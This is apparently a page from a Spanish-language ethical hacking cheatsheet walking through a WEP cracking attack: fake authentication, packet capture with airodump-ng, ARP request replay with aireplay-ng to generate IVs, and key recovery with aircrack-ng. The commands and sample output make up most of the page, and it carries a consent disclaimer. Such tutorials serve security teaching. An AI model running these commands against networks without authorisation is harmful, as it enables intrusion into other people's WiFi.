
# ARP Request Replay

{% hint style="danger" %}
**Disclaimer:** Vamos a realizar ataques a redes WiFi, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

{% hint style="info" %}
Debemos ejecutar esta técnica hasta lograr los suficientes IVs para crackear la llave
{% endhint %}

### 1. Partimos de un Fake Auth

{% content-ref url="/pages/hoxQMW9xIUWd61KaAfVg" %}
[Fake Autentication](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-redes/hacking-wifi/wep-cracking/fake-autentication.md)
{% endcontent-ref %}

### 2. Iniciar airodump-ng

Debemos guardar la salida con `--write`

```bash
# 4 - Iniciamos airodump-ng y guardamos la salida
sudo airodump-ng --bssid 00:E0:4C:6A:5A:F8 --channel 11 --write arp_rr wlan0
```

<figure><img src="/files/kTDbI7gc21lu2jEzKbPj" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Observamos que hay muy poco tráfico en la red
{% endhint %}

{% hint style="warning" %}
**Importante:** mantener abierto mientras se ejecuta aireplay-ng
{% endhint %}

### 3. aireplay --arpreplay

```bash
sudo aireplay-ng --help

Attack modes (numbers can still be used):

      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
   >> --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)
```

```bash
sudo aireplay-ng --arpreplay -b <SSID-OBJETIVO> -h <MAC-ADAPTADOR> <INTERFAZ> 
```

```bash
sudo aireplay-ng --arpreplay -b 00:E0:AC:6A:5A:F8 -h E8:4E:06:35:A9:C0 wlan0mon 
```

<figure><img src="/files/W3Zibu5KbdibbSm7qYZ4" alt=""><figcaption></figcaption></figure>

Volviendo a airodump vemos que hemos aumentado correctamente el tráfico de red

<figure><img src="/files/svMNYhE340evrgRrQHqK" alt=""><figcaption></figcaption></figure>

### 4. Iniciar aircrack-ng

Abrir el archivo .cap

```bash
sudo aircrack-ng arp_rr.cap
```

<figure><img src="/files/1J5GYoDaLk4bMe931VP1" alt=""><figcaption></figcaption></figure>

```
KEY FOUND! [12:34:56:78:90]
Password: 1234567890
```
